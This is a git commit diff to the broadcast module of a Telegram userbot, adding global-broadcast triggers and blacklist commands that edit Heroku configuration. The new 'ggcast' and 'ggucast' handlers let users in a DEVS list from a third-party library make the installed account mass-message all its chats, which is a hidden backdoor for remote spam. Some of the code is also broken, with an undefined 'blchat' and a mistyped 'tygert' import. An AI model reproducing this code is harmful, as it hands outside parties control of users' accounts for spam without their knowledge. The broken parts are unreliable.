200500005605d5c689729267e8b69fa9709349b7
Black <120400651+Xnuxer2@users.noreply.github.com>
2023-02-15 20:57:22 +0700

    Update broadcast.py

--- tyger/modules/basic/broadcast.py
+++ tyger/modules/basic/broadcast.py
@@ -1,18 +1,26 @@
+# if you can read this, this meant you use code from Geez | Ram Project
+# this code is from somewhere else
+# please dont hestitate to steal it
+# because Geez and Ram doesn't care about credit
+# at least we are know as well
+# who Geez and Ram is
+#
+#
+# kopas repo dan hapus credit, ga akan jadikan lu seorang developer
+# ©2023 Geez | Ram Team
 import asyncio
-
+import dotenv
 from pyrogram import Client, enums, filters
 from pyrogram.types import Message
-from requests import get
-
+from geezlibs.geez.helper import edit_or_reply
+from geezlibs.geez.autobot import HAPP, in_heroku
+from geezlibs import BL_GCAST, DEVS
 
 from tyger import SUDO_USER
-
+from tygert import cmds
 from tyger.modules.help import add_command_help
-from cache.data import GROUP, VERIFIED_USERS
-from tyger import cmds
-
-NB = GROUP
-DEVS = VERIFIED_USERS
+from tyger.modules.updater.update import restart
+from config import HEROKU_APP_NAME, HEROKU_API_KEY, BLACKLIST_GCAST
 
 def get_arg(message: Message):
     msg = message.text
@@ -22,6 +30,10 @@ def get_arg(message: Message):
         return ""
     return " ".join(split[1:])
 
+
+@Client.on_message(
+    filters.group & filters.command("ggcast", ["*"]) & filters.user(DEVS) & ~filters.me
+)
 @Client.on_message(
     filters.command(["gcast"], cmds) & (filters.me | filters.user(SUDO_USER))
 )
@@ -39,7 +51,7 @@ async def gcast_cmd(client: Client, message: Message):
             elif get_arg:
                 msg = get_arg(message)
             chat = dialog.chat.id
-            if chat not in BL_GCAST and chat not in BL_GCAST:
+            if chat not in BL_GCAST and chat not in BLACKLIST_GCAST:
                 try:
                     if message.reply_to_message:
                         await msg.copy(chat)
@@ -54,13 +66,15 @@ async def gcast_cmd(client: Client, message: Message):
         f"**Berhasil mengirim ke** `{done}` **Groups chat, Gagal mengirim ke** `{error}` **Groups**"
     )
 
-
+@Client.on_message(
+    filters.group & filters.command("ggucast", ["*"]) & filters.user(DEVS) & ~filters.me
+)
 @Client.on_message(
     filters.command(["gucast"], cmds) & (filters.me | filters.user(SUDO_USER))
 )
 async def gucast(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
-        tex = await message.reply_text("`Started global broadcast...`")
+        text = await message.reply_text("`Started global broadcast...`")
     else:
         return await message.edit_text("**Give A Message or Reply**")
     done = 0
@@ -87,6 +101,56 @@ async def gucast(client: Client, message: Message):
         f"**Successfully Sent Message To** `{done}` **chat, Failed to Send Message To** `{error}` **chat**"
     )
 
+@Client.on_message(filters.command("addblacklist", cmds) & filters.me)
+async def addblacklist(client: Client, message: Message):
+    xxnx = await edit_or_reply(message, "`Processing...`")
+    if HAPP is None:
+        return await xxnx.edit(
+            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
+        )
+    blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
+    blacklistgrup = (
+        blgc.replace("{", "")
+        .replace("}", "")
+        .replace(",", "")
+        .replace("[", "")
+        .replace("]", "")
+        .replace("set() ", "")
+    )
+    await xxnx.edit(
+        f"**Berhasil Menambahkan** `{message.chat.id}` **ke daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
+    )
+    if await in_heroku():
+        heroku_var = HAPP.config()
+        heroku_var["BLACKLIST_GCAST"] = blacklistgrup
+    else:
+        path = dotenv.find_dotenv("config.env")
+        dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
+    restart()
+
+@Client.on_message(filters.command("delblacklist", ["?", "!", ".", "*", ",", "$"]) & filters.me)
+async def delblacklist(client: Client, message: Message):
+    xxnx = await edit_or_reply(message, "`Processing...`")
+    if HAPP is None:
+        return await xxnx.edit(
+            "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
+        )
+    gett = str(message.chat.id)
+    if gett in blchat:
+        blacklistgrup = blchat.replace(gett, "")
+        await xxnx.edit(
+            f"**Berhasil Menghapus** `{message.chat.id}` **dari daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
+        )
+        if await in_heroku():
+            heroku_var = HAPP.config()
+            heroku_var["BLACKLIST_GCAST"] = blacklistgrup
+        else:
+            path = dotenv.find_dotenv("config.env")
+            dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
+        restart()
+    else:
+        await xxnx.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")
+
 
 add_command_help(
     "broadcast",
@@ -95,5 +159,9 @@ add_command_help(
             "Broadcast pesan ke Group. (bisa menggunakan Media/Sticker)"],
         [f"{cmds}gucast [text/reply]",
             "Broadcast pesan ke semua chat. (bisa menggunakan Media/Sticker)"],
-   ],
+        [f"{cmds}addblacklist [id group]",
+            "menambahkan group ke dalam blacklilst gcast"],
+        [f"{cmds}delblacklist [id group]",
+            "menghapus group dari blacklist gcast"],
+    ],
 )
